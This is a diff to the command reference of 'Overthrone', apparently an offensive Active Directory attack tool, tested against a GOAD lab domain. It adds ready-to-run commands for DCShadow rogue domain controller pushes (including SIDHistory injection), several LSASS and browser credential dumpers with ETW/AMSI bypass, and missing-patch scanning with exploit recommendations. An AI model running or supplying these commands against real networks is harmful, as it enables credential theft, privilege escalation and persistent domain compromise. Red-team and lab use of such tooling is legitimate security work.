@@ -1,4 +1,4 @@
-# Overthrone v0.4.0 — Complete Command Reference
+# Overthrone v0.4.1 — Complete Command Reference
 
 > Real usage examples for every command across all 9 crates.
 > Tested against GOAD-Light (WS2025) — `sevenkingdoms.local` (192.168.57.10)
@@ -45,6 +45,9 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 - [ADCS Exploitation (`ovt adcs`)](#adcs-exploitation-ovt-adcs)
 - [Forge Ticket Forging (`ovt forge`)](#forge-ticket-forging-ovt-forge)
 - [Shadow Credentials (`ovt shadow`)](#shadow-credentials-ovt-shadow)
+- [DCShadow Rogue DC Push (`ovt dcshadow`)](#dcshadow-rogue-dc-push-ovt-dcshadow)
+- [Local Credential Dumpers (`ovt local-creds`)](#local-credential-dumpers-ovt-local-creds)
+- [Sherlock Vuln Enumeration (`ovt sherlock`)](#sherlock-vuln-enumeration-ovt-sherlock)
 - [ACL/DACL Abuse (`ovt acl`)](#acldacl-abuse-ovt-acl)
 - [GPO Abuse (`ovt gpo`)](#gpo-abuse-ovt-gpo)
 
@@ -155,6 +158,9 @@ ovt enum all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
 # With filters
 ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --filter "admin"
 ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --include-disabled
+
+# Enumeration audit checklist - full coverage report
+ovt enum audit -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
 ```
 
 | Flag | Default | What it does |
@@ -177,6 +183,7 @@ ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --i
 | `gpos` | Group Policy Objects |
 | `laps` | LAPS-readable secrets |
 | `policy` | Password and domain policy |
+| `audit` | Full enumeration coverage checklist in one command |
 | `all` | Everything above |
 
 ---
@@ -491,6 +498,100 @@ ovt gpo cleanup -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
 | `enum` | | Enumerate all GPOs and their links |
 | `write` | `--gpo`/`-g` (required), `--sysvol` (required), `--command`/`-c` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Write ImmediateTask to SYSVOL |
 | `cleanup` | `--gpo`/`-g` (required), `--sysvol` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Remove previously-written task |
+
+---
+
+## DCShadow Rogue DC Push (`ovt dcshadow`)
+
+Aliases: `dc-shadow`.
+
+Register a rogue Domain Controller and push object attribute changes via MS-DRSR replication. Requires DA-equivalent privileges against the target DC.
+
+```bash
+# Basic DCShadow against a target DC
+ovt dcshadow --target-dc DC01.sevenkingdoms.local --domain sevenkingdoms.local -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Push SIDHistory attribute to a specific user
+ovt dcshadow --target-dc DC01.sevenkingdoms.local --domain sevenkingdoms.local --objects '[
+  {"dn":"CN=john,CN=Users,DC=sevenkingdoms,DC=local","attrs":{"SIDHistory":["S-1-5-21-1234-5678"]}}
+]' -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Tailor attributes with ---type (KeyCredential, SIDHistory, SPN, AdminCount)
+ovt dcshadow --target-dc DC01 --domain sevenkingdoms.local --type SIDHistory --admin -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Cleanup after DCShadow operation
+ovt dcshadow --target-dc DC01 --domain sevenkingdoms.local --cleanup -d sevenkingdoms.local -u vagrant -p vagrant
+```
+
+| Subcommand (implicit) | Flags | What it does |
+|---|---|---|
+| `dcshadow` | `--target-dc`/`-t` (required), `--domain`/`-d` (required), `--objects` (JSON string), `--type` (SIDHistory/KeyCredential/SPN/AdminCount), `--admin`, `--cleanup` | Register rogue DC and push attribute changes via MS-DRSR |
+
+---
+
+## Local Credential Dumpers (`ovt local-creds`)
+
+Aliases: `localcreds`.
+
+Execute modular credential dumping tools against a target host via SMB/WMI. Each dumper is a standalone Rust module with ETW/AMSI bypass support.
+
+```bash
+# Dump LSASS with SafetyKatz (runs procdump-style + parsing)
+ovt local-creds safety-katz -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Dump with NanoDump (minidump variant, smaller footprint)
+ovt local-creds nanodump -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Dump with HandleKatz (handle-based LSASS dump)
+ovt local-creds handle-katz -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Dump with Dumpert (direct system call, no Win32 API)
+ovt local-creds dumpert -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Dump with LaZagne (browsers, vaults, WiFi, credentials)
+ovt local-creds lazagne -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Run all dumpers in sequence, aggregate results
+ovt local-creds all --all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+```
+
+| Subcommand | Flags | What it does |
+|---|---|---|
+| `safety-katz` | Standard auth flags | LSASS dump via procdump-style + parsing |
+| `nanodump` | Standard auth flags | Minidump variant, smaller footprint |
+| `handle-katz` | Standard auth flags | Handle-based LSASS dump |
+| `dumpert` | Standard auth flags | Direct system call dump, no Win32 API |
+| `lazagne` | Standard auth flags | Extract browser/vault/Wi-Fi credentials |
+| `all` | `--all` | Run all dumpers, aggregate results |
+
+---
+
+## Sherlock Vuln Enumeration (`ovt sherlock`)
+
+Aliases: `vuln-check`, `missing-kbs`.
+
+Windows kernel/service vulnerability enumeration via missing KB discovery. Queries patch level via WMIC/PowerShell, cross-references against known CVE database.
+
+```bash
+# Full vulnerability scan against target
+ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Scan specific CVEs only
+ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --cves CVE-2025-21333
+
+# Output in JSON format for tooling
+ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --format json
+
+# Output CSV
+ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --format csv
+
+# Risk scoring threshold
+ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --min-risk high
+```
+
+| Subcommand (implicit) | Flags | What it does |
+|---|---|---|
+| `sherlock` | `--cves` (comma-separated), `--format` (json/csv/text), `--min-risk` (low/medium/high/critical) | KB discovery, CVE cross-reference, risk scoring, exploit recommendations |
 
 ---
 
